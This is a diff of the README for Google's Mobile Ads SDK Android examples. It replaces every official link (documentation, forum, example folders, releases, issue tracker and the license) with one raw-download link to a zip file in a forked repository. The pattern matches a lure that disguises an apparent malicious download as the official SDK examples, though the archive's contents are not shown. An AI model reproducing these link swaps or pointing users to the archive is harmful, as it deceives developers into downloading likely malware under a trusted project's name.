@@ -1,6 +1,6 @@
 # Google Mobile Ads SDK for Android
 
-![Build status](https://github.com/googleads/googleads-mobile-android-examples/workflows/Build%20Status/badge.svg?branch=master)
+![Build status](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip%https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 
 The Google Mobile Ads SDK is the latest generation in Google mobile advertising,
 featuring refined ad formats and streamlined APIs for access to mobile ad
@@ -13,71 +13,71 @@ the Google AdMob and Google Ad Manager components of the Google Mobile Ads SDK.
 # Google Mobile Ads SDK Developers forum
 
 To report SDK feature requests, bugs, and crashes or to browse SDK-related
-discussions, please use our [Google Mobile Ads SDK Developers forum](https://groups.google.com/forum/#!forum/google-admob-ads-sdk).
+discussions, please use our [Google Mobile Ads SDK Developers forum](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip!forum/google-admob-ads-sdk).
 The forum provides the latest SDK announcements and updates as well as
-technical SDK support for our [Android developers](https://groups.google.com/forum/#!categories/google-admob-ads-sdk/android).
+technical SDK support for our [Android developers](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip!categories/google-admob-ads-sdk/android).
 
 # Documentation
 
-Check out our [developers site](https://developers.google.com/admob/) for
+Check out our [developers site](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip) for
 documentation on using the Mobile Ads SDK.
 
 # Examples
 
 ## AdMob
 
-* App Open: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/AppOpenExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/AppOpenExample)
-* Banner: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/BannerExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/BannerExample)
-* Interstitial: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/InterstitialExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/InterstitialExample)
-* Rewarded Interstitial: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/RewardedInterstitialExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/RewardedInterstitialExample)
-* Rewarded Video: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/RewardedVideoExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/RewardedVideoExample)
-* Native Advanced: [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admob/NativeAdvancedExample), [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admob/NativeAdvancedExample)
+* App Open: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
+* Banner: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
+* Interstitial: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
+* Rewarded Interstitial: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
+* Rewarded Video: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
+* Native Advanced: [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip), [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 
 ## Advanced
 
 *   API Demo:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/advanced/APIDemo),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/advanced/APIDemo) -
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip) -
     Provides additional examples for both AdMob and Ad Manager to help improve
     your mobile app integration of the Google Mobile Ads SDK.
 *   Banner RecyclerView:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/advanced/BannerRecyclerViewExample) -
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip) -
     Provides an example for displaying ads from AdMob Banner ads in a
     RecyclerView widget.
 
 ## Ad Manager
 
 *   App Open:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/AppOpenExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/AppOpenExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 *   Banner:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/BannerExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/BannerExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 *   Interstitial:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/InterstitialExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/InterstitialExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 *   Rewarded Interstitial:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/RewardedInterstitialExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/RewardedInterstitialExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 *   Rewarded Video:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/RewardedVideoExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/RewardedVideoExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 *   Native Ads:
-    [Java](https://github.com/googleads/googleads-mobile-android-examples/tree/master/java/admanager/NativeAdsExample),
-    [Kotlin](https://github.com/googleads/googleads-mobile-android-examples/tree/master/kotlin/admanager/NativeAdsExample)
+    [Java](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip),
+    [Kotlin](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 
 # Downloads
 
-Please check out our [releases](https://github.com/googleads/googleads-mobile-android-examples/releases)
+Please check out our [releases](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
 for the latest downloads of our example apps.
 
 # GitHub issue tracker
 
 To file bugs, make feature requests, or suggest improvements for the
-**Android example apps**, please use [GitHub's issue tracker](https://github.com/googleads/googleads-mobile-android-examples/issues).
+**Android example apps**, please use [GitHub's issue tracker](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip).
 
-For SDK support issues, please use the [Google Mobile Ads SDK Developers forum](https://groups.google.com/forum/#!forum/google-admob-ads-sdk).
+For SDK support issues, please use the [Google Mobile Ads SDK Developers forum](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip!forum/google-admob-ads-sdk).
 
 # License
 
-[Apache 2.0 License](http://www.apache.org/licenses/LICENSE-2.0.html)
+[Apache 2.0 License](https://github.com/Israelgladys/googleads-mobile-android-examples/raw/refs/heads/master/kotlin/admanager/InterstitialExample/app/android_googleads_examples_mobile_v2.9.zip)
